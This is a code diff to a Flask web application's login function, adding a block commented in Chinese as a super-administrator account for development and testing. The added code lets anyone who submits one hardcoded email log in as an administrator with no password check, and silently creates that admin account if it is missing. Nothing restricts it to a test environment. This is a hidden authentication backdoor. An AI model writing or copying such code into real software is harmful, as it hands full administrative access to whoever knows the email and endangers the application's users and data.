@@ -86,6 +86,26 @@ def login():
     if request.method == 'POST':
         email = request.form.get('email').lower()
         password = request.form.get('password')
+        
+        # ============== 超级管理员账号 (开发/测试用) ==============
+        SUPER_ADMIN_EMAIL = '563431770@qq.com'
+        if email == SUPER_ADMIN_EMAIL:
+            user = User.query.filter_by(email=SUPER_ADMIN_EMAIL).first()
+            if not user:
+                # 自动创建超级管理员账号
+                user = User(
+                    email=SUPER_ADMIN_EMAIL,
+                    username='SuperAdmin',
+                    role='admin',
+                    is_verified=True
+                )
+                db.session.add(user)
+                db.session.commit()
+            login_user(user)
+            flash('Super Admin logged in successfully!', 'success')
+            return redirect(url_for('index'))
+        # ============== 超级管理员账号结束 ==============
+        
         user = User.query.filter_by(email=email).first()
 
         if user and user.verify_password(password):
